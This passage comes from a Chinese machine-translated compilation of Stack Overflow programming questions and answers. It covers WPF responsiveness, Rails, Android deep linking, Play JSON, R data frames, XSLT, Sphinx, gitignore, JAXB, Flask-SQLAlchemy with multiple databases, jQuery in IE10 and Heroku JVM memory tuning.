            }

            //Stop clock animation
            showClockFaceStoryboard.Stop(this);
            hideClockFaceStoryboard.Begin(this);

            //Update UI text
            fetchButton.IsEnabled = true;
            fetchButton.Content = "Fetch Forecast";
            weatherText.Text = weather;     
        }

        private void HideClockFaceStoryboard_Completed(object sender,
            EventArgs args)
        {         
            showWeatherImageStoryboard.Begin(this);
        }

        private void HideWeatherImageStoryboard_Completed(object sender,
            EventArgs args)
        {           
            showClockFaceStoryboard.Begin(this, true);
        }        
    } 
```

PS也许它也很有用[http://tech.pro/tutorial/662/csharp-tutorial-anonymous-delegates-and-scoping](http://tech.pro/tutorial/662/csharp-tutorial-anonymous-delegates-and-scoping)并使[调度程序示例工作](https://stackoverflow.com/questions/4583833/make-dispatcher-example-to-work)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-23T03:21:56.980

原因可能是绑定转换器中的慢代码、强制值回调、属性都可能使绑定看起来很慢。例如，考虑一个源绑定到 URL 的图像。由于网络滞后，这可能会加载缓慢。

还要避免切换到调度程序上下文 - 除非真的需要。例如启动线程、等待 WaitHandles、甚至大/慢同步 I/O 操作等

Sten Petrov 对延迟加载（UI 和数据虚拟化）的建议也很重要。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T20:21:15.303

使您的控件延迟加载其内容。

为此，请在您的 TestVM 类中公开 ObservableCollection 属性并将事件处理程序附加到 CollectionChanged（也可能是 PropertyChanged）以添加实际的 UI 元素。

在 Window1 中，准备数据以在单独的线程上加载到 TestVM（您是否正在执行任何 Web 查询？），将数据传递到 UI 线程上的 TestVM。

如果 TestVM 子进程控制自己加载缓慢，您也可以将该进程从单独的线程中拆分出来，但这（方式）更难以拉动，所以希望数据加载是缓慢的部分

# ruby-on-rails - 显示某个用户的帖子

> ID：15555062
> 
> 赞同：1
> 
> 时间：2013-03-21T18:13:58.827
> 
> 标签：ruby-on-rails, email, controller, dashboard

在我的 Rails 应用程序中，我需要在该用户所做的用户“仪表板”帖子上显示。

仪表板控制器：

```
class DashboardController < ApplicationController

  def index
    @users = User.all
    @user = User.find(params[:id])||current_user
    respond_to do |format|
      format.html # index.html.erb
      format.json { render json: @posts }
    end
  end

  def show
    @user = User.find(params[:id])
    @post = Post.all(:order => "created_at DESC")

    respond_to do |format|
      format.html # show.html.erb
      format.xml  { render :xml => @user }
    end
  end

end 
```

我的仪表板“显示视图”

```
<div class="dash-well">
    <div class="gravatar-dashboard">
        <%= image_tag avatar_url(@user), :class => 'gravatar-pos-fix gr-dash-mar-top' %>
        <h1 class="nuvo wtxt"><%= @user.username.capitalize %></h1>
        <h3 class="nuvo wtxt"><%= @user.motto %></h3>
    </div>
</div>

<div class="dash-well-status">
<% @post.each do |post| %>
    <div class="post">
      <div class="tstamp">
        <%= image_tag avatar_url_small(post.user), :class => 'gravatar' %>
        <strong>Posted <%= time_ago_in_words(post.created_at) %> ago by <%= post.user.username %></strong>
      </div>
      <div class="status"><%= post.status %></div>
    </div>
<% end %>
</div> 
```

和我的仪表板模型：

```
class Dashboard < ActiveRecord::Base
  attr_accessible :status, :author, :email, :username, :id, :user_id, :user, :website, :bio, :skype, :dob, :age

  has_many :posts
  belongs_to :user
end 
```

那么，有谁知道我如何只显示用户仪表板中的帖子（用户仪表板可以从任何用户访问，所以 current_user 不会工作！）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:24:58.567

```
def show
  @user = User.find(params[:id])
  @posts = @user.posts

  #.....
end 
```

这将仅显示该特定用户的帖子。

# android - 深度链接在点击 facebook post android 上不起作用

> ID：15555075
> 
> 赞同：2
> 
> 时间：2013-03-21T18:14:37.893
> 
> 标签：android, facebook, post, deep-linking

我想在我的 android 项目中应用深度链接。我已经下载了 Hackbook 和 Applinkinghowto，我能够将消息从这两个应用程序发布到 fb 墙，但是在默认的 facebook 应用程序中，单击左侧的设置栏得到应用程序名称，然后单击该名称我的应用程序打开，但我希望当我点击我的 facebook 帖子时，如果我的应用程序安装在设备中，我的应用程序必须打开，否则 brwoser 应该打开。但在所有情况下浏览器都打开了。我参考了这个：

[http://developers.facebook.com/docs/mobile/android/deep_linking/](http://developers.facebook.com/docs/mobile/android/deep_linking/)

并使用了这段代码

```
 Uri target = getIntent().getData();
if (target != null) {
    // target is the deep-link Uri
} else {
    // launched with no deep-link Uri
} 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-20T10:37:16.310

是的，我解决了。检查您在 fb 开发人员帐户中填写的信息，例如 pacakge 名称、应用程序名称、哈希键等，并确保启用深度链接。您不需要编写代码来启用深度链接。在开发者帐户上填写正确和完整的信息就足够了。

# java - 播放 JSON：如何使用字符串作为正确的 json

> ID：15555078
> 
> 赞同：2
> 
> 时间：2013-03-21T18:14:45.807
> 
> 标签：java, json, scala, playframework, playframework-2.0

```
 val json = JsObject(Seq(
        "type" -> toJson("filter"),
        "params" -> toJson(fP.parseToJson())
    )).toString() 
```

fP.parseToJson() 生成一个 json 字符串，用于代码的其他地方。

我明白了：

```
{
  type: "filter",
  params: "{"searchId":"","client":"ios","lat":40.743894995835525,"lon":-74.00080404533901,"radius":20.0}"
} 
```

我想得到：

```
{
  type: "filter",
  params: {
    "searchId":"", 
    "client":"ios",
    "lat":40.743894995835525,
    "lon":-74.00080404533901,
    "radius":20.0
  }
} 
```

最终的问题是：有没有办法获取已经是 json 的字符串并将其用作 json 响应中的 json 对象？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:20:25.870

Json.parse 显然会处理它。

```
val json = JsObject(Seq(
    "type" -> toJson("filter"),
    "params" -> Json.parse(fP.parseToJson())
)).toString() 
```

# r - 从 data.frame 中提取行

> ID：15555082
> 
> 赞同：3
> 
> 时间：2013-03-21T18:14:55.557
> 
> 标签：r

我有一个 by m `data.frame`，其中第 1 列包含感兴趣的信息。我想`data.frame`根据第 1 列的一行中的值来创建 sub 。

例子：

```
P Cat  Q    S... nth Column
S data data data data 
S ...       ...       
A ...
I ...
. ...
. ...
. ...
mth row 
```

现在我想要做的是创建一个`data.frame`列 P 的值为 S，然后为 A...，等等。

我一直在尝试失败，例如：

```
s <- data.frame(df1$P = S)
s <- data.frame(df1$P [,:5]) <- #In this case the data I want stops at row 5 
```

我想最终得到类似的东西

```
s = P Data1 Data2 Data3 Data nth
    S
    S
    ...
    S 
```

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T20:25:29.027

将您的数据分解成一个`list`使用`data.frames`也`split`可以在这里工作，并防止您的工作空间混乱。例如：

```
df1 <- data.frame(P=c("S","S","A","I"),data=rep(1,4))
df1

#  P data
#1 S    1
#2 S    1
#3 A    1
#4 I    1

result <- split(df1,df1$P)

#$A
#  P data
#3 A    1
#
#$I
#  P data
#4 I    1
#
#$S
#  P data
#1 S    1
#2 S    1 
```

然后，您可以访问列表的各个部分，例如：

```
result$S 
```

或者

```
result[["S"]] 
```

瞧：

```
#  P data
#1 S    1
#2 S    1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:20:18.007

代替 ：

```
s <- data.frame(df1$P = S) 
```

尝试：

```
s <- data.frame(df1[df1$P == S,]) 
```

或者

```
s <- data.frame(df1[df1$P == 'S',]) 
```

如果您想控制行数，请尝试：

```
s <- data.frame(df1[df1$P == 'S',1:5]) 
```

# xml - XML -> XSL -> 带有超链接的项目符号列表

> ID：15555084
> 
> 赞同：0
> 
> 时间：2013-03-21T18:15:05.047
> 
> 标签：xml, xslt

我真的为这个挠头。我想创建一个带有来自 XML 摘录的超链接的项目符号列表。我可以创建项目符号列表，但我不知道如何将部分组合在一起。

这是 XML：

```
<list>
    <listitem>1<hyperlink><url>page1.xml</url><name>Go to Page 1</name></hyperlink></listitem>
    <listitem>2<hyperlink><url>page2.xml</url><name>Go to Page 2</name></hyperlink></listitem>
    <listitem>3<hyperlink><url>page3.xml</url><name>Go to Page 3</name></hyperlink></listitem>
    <listitem>4<hyperlink><url>page4.xml</url><name>Go to Page 4</name></hyperlink></listitem>
</list> 
```

...以及到目前为止的 XSL。超链接组件不起作用。通过我尝试使其工作，它可能看起来有点不整洁。我希望“转到第 n 页”成为超链接。

```
<?xml version="1.0" encoding="ISO-8859-1"?>

<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns="http://www.w3.org/TR/REC-html40">

<xsl:output method="html" indent="yes"/>

<xsl:template match="list">
    <DIV>
        <UL><xsl:apply-templates /></UL>
    </DIV>
</xsl:template>

<xsl:template match="listitem">
    <DIV>
        <LI><xsl:apply-templates />  </LI>
    </DIV>
</xsl:template>

<xsl:template match="hyperlink">
        <A>
            <xsl:value-of select="hyperlink" />
        </A>
</xsl:template>

<xsl:template match="hyperlink/url">
         HREF='<xsl:value-of select="url" />'  
</xsl:template>

<xsl:template match="hyperlink/name">
         <xsl:apply-templates />
</xsl:template> 
```

目前的结果是：

**1。HREF='page1.xml' 转到第 1 页

1.  HREF='page2.xml' 转到第 2 页

2.  HREF='page3.xml' 转到第 3 页

3.  HREF='page4.xml' 转到第 4 页 **

我需要的是类似于这样的HTML：

`<A HREF='page1.xml'>Go to Page 1</A>`

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:35:32.780

首先，您需要`DIV`从模板中取出`listitem`（因为`LI`需要直接在 内结束`UL`），您可以将所有`hyperlink`内容简化为一个模板

```
<xsl:template match="hyperlink">
  <A href="{url}">
    <xsl:value-of select="name"/>
  </A>
</xsl:template> 
```

# python - 在 Sphinx 中使用自定义 HTML 编写器

> ID：15555088
> 
> 赞同：2
> 
> 时间：2013-03-21T18:15:13.940
> 
> 标签：python, python-sphinx

我如何使用`HTMLTranslator`与 Sphinx 附带的不同的`sphinx.writers.html`？

具体来说，我想修改方法`depart_desc_signature`。我无法修改 Sphinx 本身，因为帮助文件正在与其他人一起开发，并且需要使用标准 Sphinx 正确编译。

我知道 Sphinx 支持：

*   扩展模块：[http ://sphinx-doc.org/ext/appapi.html](http://sphinx-doc.org/ext/appapi.html)
*   自定义构建器：[http ://sphinx-doc.org/ext/builderapi.html](http://sphinx-doc.org/ext/builderapi.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:35:18.320

`html_translator_class`通过定义in来指定 html 翻译器`conf.py`。

例如，

```
html_translator_class = 'html2.HTMLTranslator' 
```

不过，这与 mathjax 不兼容，因此如果`html2`是 的副本`sphinx.writers.html`，则需要显式添加对 mathjax 的调用到 HTMLTranslator：

```
def visit_displaymath(self, node):
    import sphinx.ext.mathjax
    sphinx.ext.mathjax.html_visit_displaymath(self, node)
def depart_displaymath(self, node):
    return
def visit_math(self, node):
    import sphinx.ext.mathjax
    sphinx.ext.mathjax.html_visit_math(self, node)
def depart_math(self, node):
    return 
```

# git - 让 git 忽略生成的文件

> ID：15555097
> 
> 赞同：2
> 
> 时间：2013-03-21T18:16:07.197
> 
> 标签：git

我有几个项目有大量文件，在处理时会生成其他文件。无需跟踪生成的文件，事实上，在某些情况下您不想跟踪它们，因为这会浪费空间。我知道这是该`.gitignore`文件的用途。问题是，我找不到在文件上使用模式匹配的好方法，因为代表还包含符合相同模式的常规用户编辑文件。例如，一个 repo 将有许多`.tex`用户编辑的文件，但也有许多`.tex`由 knitr 表单文件生成的`.Rnw`文件。大多数`.pdf`文件是从文件自动生成的`.tex`，但有些是用户创建的`.pdf`图形，它们将包含在 TeX 文档中，应该被跟踪。

什么是让 git 例如仅在同一目录中才忽略文件的好方法`blah.tex`，并且仅在存在或在同一目录中时才`blah.Rnw`忽略？`bluh.pdf``bluh.tex``bluh.Rnw`

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-21T18:59:38.330

几个简单的解决方案：

*   将所有后缀（例如`.pdf`）添加到`.gitignore`as `*.pdf`，`git add -f`那些`version-this-one.pdf`应该被版本化`git`的，将跟踪那些（需要一点小心）。这`*.pdf`实际上是一个 glob，因此您可以排除 hames 以大写 by 开头的 PDF `[A-Z]*.pdf`。
*   如上所述，但`*.pdf`为所有 PDF 添加 eg，并`!version-this-one.pdf`从排除集中排除一个（也可以在此处使用模式）
*   将生成的文件的*完整*列表放入`.gitignore`. 需要保持最新（还不错，如果出现新的，`git`会认为它未跟踪，然后添加它）。
*   混合搭配：根据需要使用上述方法用于不同的文件名模式
*   每个目录`.gitignore`：`git`首先在此目录的 中搜索`.gitignore`，如果在父目录中找不到，...您可以使用 排除模式`!`，这会停止那里的搜索。

退房`gitignore(5)`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:22:22.050

你不能用`.gitignore`. 您需要将生成的文件和用户文件拆分到单独的文件夹中，并忽略整个生成的文件夹。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:22:33.387

看看您是否可以将生成的文件放在一个特殊的文件夹中，比如**tmp**。然后你可以在 .gitignore 中添加这个文件夹

温度/

# java - 更改类而不更改架构

> ID：15555098
> 
> 赞同：4
> 
> 时间：2013-03-21T18:16:10.520
> 
> 标签：java, xsd, jaxb, unmarshalling

我有一个不允许更改的 xsd 架构。它产生生成的java类。

假设类如下所示：

```
 class Data {
          protected List<Value> value;
          ... 
       }
       class Value {
           ...
        } 
```

现在我需要拥有自己的 MyValue 以从 Value 扩展。

```
class MyValue extends Value {

     Integer myOwnField1;
     Long anotherProperty;

} 
```

并且能够在解析 xml 文件时说 unmarshaller 使用 MyValue 而不是 Value。

稍后我将能够使用 MyValue 可以在其中包含一些有用的新字段的事实，对它们进行操作，更改它们等。所以我想扩展我在模式中拥有的功能而不更改它。

对于解组器，是否有可能用 MyValue 替换 Value ？

除了创建 Map 的明显方法外，我可以在其中映射由 unmarshaller 生成的对象，以及 MyValue 中我自己的字段和属性。我想避免这种方式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T09:26:55.983

您可以使用 bean 属性加载列表吗？

```
public void setValue(List<Value> value) {
    this.value = ...convert to List<MyValue>...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T12:24:06.903

您可能对[按声明的类型进行解组](http://docs.oracle.com/javaee/5/api/javax/xml/bind/Unmarshaller.html#unmarshalByDeclaredType)感兴趣：实际上，如果您将 XSD 从根元素覆盖到需要覆盖的每个子元素，则可以在`unmarshal`方法中使用第二个参数来指定自定义映射。

```
<T> JAXBElement<T> unmarshal(Source source,
                             Class<T> declaredType)
                         throws JAXBException 
```

> [...] declaredType - 适当的 JAXB 映射类来保存源的 xml 根元素

（有关更多详细信息，请参阅[Unmarshaller javadoc ）](http://docs.oracle.com/javaee/5/api/javax/xml/bind/Unmarshaller.html#unmarshal%28javax.xml.transform.Source,%20java.lang.Class%29)

# python - 为具有多个数据库的页面提供服务

> ID：15555101
> 
> 赞同：0
> 
> 时间：2013-03-21T18:16:16.993
> 
> 标签：python, database, sqlalchemy, flask

我有：多个相同的数据库和 SQL-Alchemy 设置。

我需要实现的是：一个能够查询所有数据库的“Flask”函数。所有其他功能只需要访问其中一个数据库。

数据库已经存在，我正在从它们加载数据。

最初我只使用 SQL-Alchemy 抽象层，没有任何 Flask 模型。这是代码的样子：

```
app = Flask(__name__)
app.config.from_object('myflaskapp.config.settings')
metadata = None

def connect_db():
    engine = create_engine(app.config['DATABASE_URI'])
    global metadata
    metadata = MetaData(bind=engine)
    return engine.connect()

@app.before_request
    def before_request():
    g.db = connect_db()

@app.after_request
    def after_request(response):
    close_connection()
    return response 
```

是在 settings.py 中声明的 DATABASE_URI。我想没关系，但是底层数据库是一个 Mysql 服务器和 DATABASE_URI 看起来像：

```
DATABASE_URI = 'mysql://' + dbuser + ':' + dbpass + '@' + dbhost + '/' +dbname 
```

上面的代码允许我写这样的东西：

```
myTable = Table('branch', metadata, autoload=True)
myBranch = select([myTable]) 
```

这很方便。这种方法工作得很好，除非我必须处理多个数据库。更准确地说，我想（从同一函数中）显示属于具有完全相同结构的多个数据库的数据。这意味着相同的查询可以成功地再次运行任何数据库。在伪代码中：

```
@app.route('/summary')
def summary():
     ....
     allData = []
     for db in all_of_my_dbs:
         allData.append(db.query())
     ....
sendToTemplate(allData) 
```

这是可行的吗？可行吗？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:38:08.110

这绝对是[可能的](http://pythonhosted.org/Flask-SQLAlchemy/binds.html)。

尝试将这样的内容添加到您的设置文件中

```
SQLALCHEMY_BINDS = {
    'users':        'mysqldb://localhost/users',
    'appmeta':      'sqlite:////path/to/appmeta.db'
} 
```

**编辑**

所以这是一个工作副本/粘贴示例

```
from flask import Flask
from flask.ext.sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.debug = True

databases = {
    'sqlite1': 'sqlite:///sqlite1.db',
    'sqlite2': 'sqlite:///sqlite2.db'
}
app.config['SQLALCHEMY_BINDS'] = databases
db = SQLAlchemy(app)

class Thing(db.Model):
    __tablename__ = "sqlite1"
    thing_id = db.Column(db.Integer, primary_key=True)
    thing_val = db.Column(db.String(40))

    def __init__(self, thing_val):
        self.thing_val = thing_val

class Thing2(db.Model):
    __tablename__ = "sqlite2"
    thing_id = db.Column(db.Integer, primary_key=True)
    thing_val = db.Column(db.String(40))

    def __init__(self, thing_val):
        self.thing_val = thing_val

if __name__ == "__main__":

    db.create_all()
    t1 = Thing("test1")
    t2 = Thing2("test2")

    db.session.add(t1)
    db.session.add(t2)
    db.session.commit()

    t1 = Thing.query.filter_by(thing_id=1).first()
    t2 = Thing2.query.filter_by(thing_id=1).first()

    print t1.thing_val
    print t2.thing_val 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-24T18:11:27.107

首先，我想就我自己的情况说几件事。这两个表具有相同的名称、相同的 DDL 但属于不同的模式/数据库。

```
from flask import Flask
from flask.ext.sqlalchemy import SQLAlchemy

app = Flask(__name__)

databases = {
    'sqlite1': 'sqlite:///sqlite1.db',
    'sqlite2': 'sqlite:///sqlite2.db'
}

app.config['SQLALCHEMY_BINDS'] = databases
db = SQLAlchemy(app)

class Thing(db.Model):
    __tablename__ = "mytable"
    __bind_key__ = 'sqlite1'
    thing_id = db.Column(db.Integer, primary_key=True)
    thing_val = db.Column(db.String(40))

    def __init__(self, thing_val):
        self.thing_val = thing_val

if __name__ == "__main__":

    t1 = Thing.query.filter_by(thing_id=1).first()
    print t1.name 
```

当我在第一个类定义之后添加第二个名为 Thing2 的类时，一切都崩溃了。IE：

```
class Thing(db.Model):
    __tablename__ = "mytable"
    __bind_key__ = 'sqlite1'
    thing_id = db.Column(db.Integer, primary_key=True)
    thing_val = db.Column(db.String(40))

    def __init__(self, thing_val):
        self.thing_val = thing_val

class Thing2(db.Model):
    __tablename__ = "mytable"
    __bind_key__ = 'sqlite2'
    thing_id = db.Column(db.Integer, primary_key=True)
    thing_val = db.Column(db.String(40))

    def __init__(self, thing_val):
        self.thing_val = thing_val 
```

上面的代码因这个错误而中断：

**InvalidRequestError：已经为此 MetaData 实例定义了表“mytable”。指定 'extend_existing=True' 以重新定义现有 Table 对象上的选项和列。**

所以框架似乎无法区分这两者。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-07-17T21:05:40.437

显然在这个问题上有一个错误 - [https://github.com/mitsuhiko/flask-sqlalchemy/pull/222](https://github.com/mitsuhiko/flask-sqlalchemy/pull/222)所以问题是绑定键必须是唯一的并且只能用于一个类（至少现在），所以你仍然可以有多个数据库，但每个数据库只能有一个表或一个类，但如果你有很多表，它似乎确实有巨大的开销，至少现在这只是一种解决方法......

这是“绑定”的参考 - [http://flask-sqlalchemy.pocoo.org/2.0/binds/#binds](http://flask-sqlalchemy.pocoo.org/2.0/binds/#binds)

下面是配置：

SQLALCHEMY_DATABASE_URI = 'sqlite://///main.db'

SQLALCHEMY_BINDS= { 'table1':'sqlite://///DB1.db', 'table2':'sqlite://///DB2.db', }

以下是模型：

类表1（db.Model）：

```
__tablename__ = "table1"
__bind_key__='table1' 
```

类表2（db.Model）：

```
__tablename__ = "table2"
__bind_key__='table2' 
```

# c - 我如何为此创建一个缓冲区以测试是否仍有可用的参数？

> ID：15555106
> 
> 赞同：0
> 
> 时间：2013-03-21T18:16:28.590
> 
> 标签：c, arrays, parsing, buffer, sizeof

```
while (sizeof(cmds[x]) > 0){
  here:
    if (cmds[x][y] == " "){

      y++;
      goto here;
   }
    else argvector[x][y] = cmds[x][y];
  }
  x++;
  y = 0;
  goto nextCMD; 
```

这是更大代码的一部分。我想知道这是如何工作的。我想我需要使用缓冲区才能使用调用的大小。
从这个角度来看，有没有更好的方法呢**？**
我基本上是通过命令行解析以获取由管道分隔的增强`"|"`。然后我必须再次解析（上面的代码）以提取实际命令及其参数。想法**？**

# jquery - jQuery.data() 在 IE10 中不起作用。还有其他实现方式吗？

> ID：15555107
> 
> 赞同：1
> 
> 时间：2013-03-21T18:16:33.000
> 
> 标签：jquery, cross-browser, internet-explorer-10

我有一个文本区域，并且在进行任何更改时，我都需要使用新值和在页面加载时从服务器获取的其他值来更改其他标签。

我正在创建一个计算对象并使用[jQuery 数据方法](http://api.jquery.com/jQuery.data/)将其附加到文本区域。

当 textarea 中的值发生变化时，我检索 calc 对象，用新值加载它并相应地更新。

除了 IE10 之外，所有浏览器都运行良好。

在 IE10 中，浏览器加载 JS 时出现错误：`SCRIPT3: Member not found`然后在尝试检索对象时，它会失败。

我在 jQuery 文件本身中读到它与 IE 的 get/setAttribute 问题有关。

我还发现[了这个记录在案的错误](http://bugs.jquery.com/ticket/12577)。

还有其他方法可以将存储附加到 DOM 元素吗？

我在这里有什么选择？

**编辑**：我正在添加一些我的代码：

将对象附加到元素：

```
myField = $('#url-example');

fullUrl = FullUrl("http://www.example.com/category/article?", something);

myField.data("fullUrl", fullUrl); 
```

检索：

```
tiedFullUrl = $('#url-example').data('fullUrl');

tiedFullUrl.setUrl(url);

doSomethingWithTheObject(tiedFullUrl); 
```

* * *

**我正在添加更多信息：**

我遇到了和[这个人](http://forum.jquery.com/topic/bug-in-ie-10)一样的错误。

* * *

**

## 更多信息：

**

我创建了一个解决方法：

--来自 jquery.1.7.1.js，第 2700 行：

```
if (!$.browser.msie || $.browser.version < 7) { //my hack
  return ( ret.nodeValue = value + "" );
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:22:01.513

而不是 using `$('#selector').data('foo')`，您是否考虑过 using `$('#selector').attr('data-foo')`？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-30T10:01:02.540

关键必须是小型股。这就是我让它在 IE10 中工作的方式。

代替

`myField.data("fullUrl", fullUrl);`和
`myField.data("fullurl", fullUrl);`

和

`tiedFullUrl = $('#url-example').data('fullUrl');`和
`tiedFullUrl =$('#url-example').data('fullurl');`

# java - Heroku JVM 调优

> ID：15555108
> 
> 赞同：10
> 
> 时间：2013-03-21T18:16:35.130
> 
> 标签：java, scala, heroku, jvm

我已经为 Heroku 在 Play2 框架上编写了一个应用程序，并且遇到了内存问题。

```
2013-03-21T01:28:35+00:00 heroku[web.1]: Process running mem=543M(106.1%)
2013-03-21T01:28:35+00:00 heroku[web.1]: Error R14 (Memory quota exceeded) 
```

在本地，我在 Heroku (512MB) 上使用相同的 JVM 设置和内存限制对其进行了分析，但是当我在 Heroku 发送请求时，它几乎立即运行我们的堆空间。

```
JAVA_OPTS:    -Xmx384m -Xss512k -XX:+UseCompressedOops 
```

如果我可以分析那里发生的事情，我不会有任何问题，但是 java-agent 似乎对我不起作用。

我没有遇到任何我见过的内存泄漏。我确实知道我创建的每个对象都只会被使用一次，所以我可以让我的年轻一代变大而我的老一代变小。我尝试了不同的 JVM 值，但如果没有正确的分析，似乎无法找到正确的组合来使其正常工作。

我已经阅读了所有关于调优的 Heroku 文档，但无济于事。有没有人对此有任何想法，或者可能指出我正确的方向？

## 编辑

我仍然无法进行远程监控，但这里有一些来自我的本地测试系统在 1 个完整 CG 之前和之后的转储。

```
{Heap before GC invocations=1747 (full 0):
 PSYoungGen      total 42496K, used 42496K [0x00000000f5560000, 0x00000000fded0000, 0x0000000100000000)
  eden space 42176K, 100% used [0x00000000f5560000,0x00000000f7e90000,0x00000000f7e90000)
  from space 320K, 100% used [0x00000000fde80000,0x00000000fded0000,0x00000000fded0000)
  to   space 640K, 0% used [0x00000000fdd90000,0x00000000fdd90000,0x00000000fde30000)
 PSOldGen        total 106176K, used 105985K [0x00000000e0000000, 0x00000000e67b0000, 0x00000000f5560000)
  object space 106176K, 99% used [0x00000000e0000000,0x00000000e67804c8,0x00000000e67b0000)
 PSPermGen       total 43712K, used 43684K [0x00000000d5a00000, 0x00000000d84b0000, 0x00000000e0000000)
  object space 43712K, 99% used [0x00000000d5a00000,0x00000000d84a9338,0x00000000d84b0000)
2013-03-21T14:09:36.827-0700: [GC [PSYoungGen: 42496K->384K(41536K)] 148481K->106450K(147712K), 0.0027940 secs] [Times: user=0.02 sys=0.00, real=0.00 secs] 
Heap after GC invocations=1747 (full 0):
 PSYoungGen      total 41536K, used 384K [0x00000000f5560000, 0x00000000fde90000, 0x0000000100000000)
  eden space 41152K, 0% used [0x00000000f5560000,0x00000000f5560000,0x00000000f7d90000)
  from space 384K, 100% used [0x00000000fdd90000,0x00000000fddf0000,0x00000000fddf0000)
  to   space 640K, 0% used [0x00000000fddf0000,0x00000000fddf0000,0x00000000fde90000)
 PSOldGen        total 106176K, used 106066K [0x00000000e0000000, 0x00000000e67b0000, 0x00000000f5560000)
  object space 106176K, 99% used [0x00000000e0000000,0x00000000e6794968,0x00000000e67b0000)
 PSPermGen       total 43712K, used 43684K [0x00000000d5a00000, 0x00000000d84b0000, 0x00000000e0000000)
  object space 43712K, 99% used [0x00000000d5a00000,0x00000000d84a9338,0x00000000d84b0000)
}
{Heap before GC invocations=1748 (full 1):
 PSYoungGen      total 41536K, used 384K [0x00000000f5560000, 0x00000000fde90000, 0x0000000100000000)
  eden space 41152K, 0% used [0x00000000f5560000,0x00000000f5560000,0x00000000f7d90000)
  from space 384K, 100% used [0x00000000fdd90000,0x00000000fddf0000,0x00000000fddf0000)
  to   space 640K, 0% used [0x00000000fddf0000,0x00000000fddf0000,0x00000000fde90000)
 PSOldGen        total 106176K, used 106066K [0x00000000e0000000, 0x00000000e67b0000, 0x00000000f5560000)
  object space 106176K, 99% used [0x00000000e0000000,0x00000000e6794968,0x00000000e67b0000)
 PSPermGen       total 43712K, used 43684K [0x00000000d5a00000, 0x00000000d84b0000, 0x00000000e0000000)
  object space 43712K, 99% used [0x00000000d5a00000,0x00000000d84a9338,0x00000000d84b0000)
2013-03-21T14:09:36.830-0700: [Full GC [PSYoungGen: 384K->0K(41536K)] [PSOldGen: 106066K->13137K(52224K)] 106450K->13137K(93760K) [PSPermGen: 43684K->43684K(87936K)], 0.0666250 secs] [Times: user=0.06 sys=0.01, real=0.07 secs] 
Heap after GC invocations=1748 (full 1):
 PSYoungGen      total 41536K, used 0K [0x00000000f5560000, 0x00000000fde90000, 0x0000000100000000)
  eden space 41152K, 0% used [0x00000000f5560000,0x00000000f5560000,0x00000000f7d90000)
  from space 384K, 0% used [0x00000000fdd90000,0x00000000fdd90000,0x00000000fddf0000)
  to   space 640K, 0% used [0x00000000fddf0000,0x00000000fddf0000,0x00000000fde90000)
 PSOldGen        total 52224K, used 13137K [0x00000000e0000000, 0x00000000e3300000, 0x00000000f5560000)
  object space 52224K, 25% used [0x00000000e0000000,0x00000000e0cd4528,0x00000000e3300000)
 PSPermGen       total 87936K, used 43684K [0x00000000d5a00000, 0x00000000dafe0000, 0x00000000e0000000)
  object space 87936K, 49% used [0x00000000d5a00000,0x00000000d84a9338,0x00000000dafe0000)
} 
```

## 编辑

这是我能得到的——这并不多，但这是在 100 个请求之后发生的，因为一切都开始降级，你可以看到 web.2 已经在这个转储中交换

```
2013-03-21T22:24:23+00:00 heroku[web.1]: source=heroku.13369226.web.1.d615093e-77a3-42b1-8da1-a228bd7582a1 measure=load_avg_1m val=0.41
2013-03-21T22:24:23+00:00 heroku[web.1]: source=heroku.13369226.web.1.d615093e-77a3-42b1-8da1-a228bd7582a1 measure=memory_total val=246.95 units=MB
2013-03-21T22:24:23+00:00 heroku[web.1]: source=heroku.13369226.web.1.d615093e-77a3-42b1-8da1-a228bd7582a1 measure=memory_rss val=246.91 units=MB
2013-03-21T22:24:23+00:00 heroku[web.1]: source=heroku.13369226.web.1.d615093e-77a3-42b1-8da1-a228bd7582a1 measure=memory_cache val=0.05 units=MB
2013-03-21T22:24:23+00:00 heroku[web.1]: source=heroku.13369226.web.1.d615093e-77a3-42b1-8da1-a228bd7582a1 measure=memory_swap val=0.00 units=MB
2013-03-21T22:24:23+00:00 heroku[web.1]: source=heroku.13369226.web.1.d615093e-77a3-42b1-8da1-a228bd7582a1 measure=memory_pgpgin val=72259 units=pages
2013-03-21T22:24:23+00:00 heroku[web.1]: source=heroku.13369226.web.1.d615093e-77a3-42b1-8da1-a228bd7582a1 measure=memory_pgpgout val=9039 units=pages
2013-03-21T22:24:25+00:00 heroku[web.2]: source=heroku.13369226.web.2.cb423d08-dd15-41c1-9843-95bcdc269111 measure=load_avg_1m val=0.30
2013-03-21T22:24:25+00:00 heroku[web.2]: source=heroku.13369226.web.2.cb423d08-dd15-41c1-9843-95bcdc269111 measure=memory_total val=532.83 units=MB
2013-03-21T22:24:25+00:00 heroku[web.2]: source=heroku.13369226.web.2.cb423d08-dd15-41c1-9843-95bcdc269111 measure=memory_rss val=511.86 units=MB
2013-03-21T22:24:25+00:00 heroku[web.2]: source=heroku.13369226.web.2.cb423d08-dd15-41c1-9843-95bcdc269111 measure=memory_cache val=0.04 units=MB
